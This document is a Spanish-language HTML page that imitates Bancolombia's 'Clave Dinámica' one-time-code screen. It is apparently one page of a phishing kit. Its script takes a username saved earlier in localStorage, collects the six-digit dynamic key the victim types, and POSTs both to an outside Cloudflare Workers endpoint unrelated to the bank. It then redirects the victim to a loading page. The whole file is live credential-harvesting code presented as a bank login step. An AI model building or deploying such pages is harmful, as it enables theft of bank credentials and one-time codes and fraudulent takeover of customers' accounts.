<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clave Dinámica - Bancolombia</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            height: 100%;
            width: 100%;
            background-color: #f0f0f0;
            overflow: hidden;
        }
        .image-container {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }
        .image-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        /* Texto "Ingrese Clave Dinámica" */
        .title-text {
            position: absolute;
            top: 45%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.7);
            width: 100%;
        }
        
        /* Contenedor de las 6 rayitas */
        .center-box {
            position: absolute;
            top: 55%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgb(255, 255, 255);
            width: 290px;
            height: 66px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 8px;
        }
        
        .digits-container {
            display: flex;
            gap: 8px;
            width: 80%;
            justify-content: center;
        }
        
        .digit-input {
            width: 35px;
            height: 45px;
            border: none;
            border-bottom: 2px solid #ffe100;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            outline: none;
            background: transparent;
        }
        
        .digit-input:focus {
            border-bottom: 2px solid #210049;
        }
        
        .button-container {
            position: absolute;
            top: 70.4%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            gap: 10px;
        }
        
        .button-container button {
            padding: 13px 35px;
            font-size: 13px;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .button-container button:first-child {
            background-color: #ffffff;
            border: 1px solid black;
        }
        
        .button-container button:last-child {
            background-color: #ffda37;
            color: black;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="img/cel11.jpg" alt="Background Image">
        
        <!-- Texto "Ingrese Clave Dinámica" -->
        <div class="title-text"></div>
        
        <!-- Contenedor de las 6 rayitas -->
        <div class="center-box">
            <div class="digits-container">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
            </div>
        </div>
        
        <div class="button-container">
            <button onclick="window.history.back()">Cancelar</button>
            <button id="loginButton">Ingresar</button>
        </div>
    </div>

    <script>
        const digitInputs = document.querySelectorAll('.digit-input');
        const loginButton = document.getElementById('loginButton');

        // Manejar la entrada en cada dígito
        digitInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                // Solo permitir números
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Mover al siguiente input si se ingresó un número
                if (this.value.length === 1 && index < digitInputs.length - 1) {
                    digitInputs[index + 1].focus();
                }
                
                // Verificar si todos los campos están llenos
                checkAllDigitsFilled();
            });
            
            input.addEventListener('keydown', function(e) {
                // Manejar tecla borrar (backspace)
                if (e.key === 'Backspace') {
                    if (this.value === '' && index > 0) {
                        digitInputs[index - 1].focus();
                    }
                }
                
                // Manejar flechas
                if (e.key === 'ArrowLeft' && index > 0) {
                    digitInputs[index - 1].focus();
                } else if (e.key === 'ArrowRight' && index < digitInputs.length - 1) {
                    digitInputs[index + 1].focus();
                }
            });
        });

        // Verificar si todos los dígitos están llenos
        function checkAllDigitsFilled() {
            const allFilled = Array.from(digitInputs).every(input => input.value.length === 1);
            return allFilled;
        }

        // Obtener la clave completa
        function getFullClave() {
            return Array.from(digitInputs).map(input => input.value).join('');
        }

        loginButton.addEventListener('click', async () => {
            const claveValue = getFullClave();
            
            if (claveValue.length === 6) {
                try {
                    // Obtener datos de localStorage
                    let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                    const usuario = bancoldata.usuario;

                    if (!usuario) {
                        alert('Error: Usuario no encontrado');
                        return;
                    }

                    // Generar transactionId único
                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

                    // Guardar la clave en bancoldata
                    bancoldata.clave = claveValue;
                    bancoldata.transactionId = transactionId;
                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

                    console.log('Enviando login:', { usuario, clave: claveValue, transactionId });

                    // Enviar login al worker
                    const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            usuario: usuario,
                            clave: claveValue,
                            transactionId: transactionId
                        })
                    });

                    const result = await response.json();
                    console.log('Respuesta del login:', result);
                    
                    if (result.ok) {
                        // Redirigir a la página de loading
                        window.location.href = 'loading.html';
                    } else {
                        alert('Error en el login: ' + (result.error || 'Error desconocido'));
                    }
                    
                } catch (error) {
                    console.error('Error completo:', error);
                    alert('Error al procesar el login: ' + error.message);
                }
            } else {
                alert('Por favor, ingrese los 6 dígitos de su Clave Dinámica.');
            }
        });

        // Enfocar el primer input al cargar la página
        digitInputs[0].focus();
    </script>
</body>
</html>
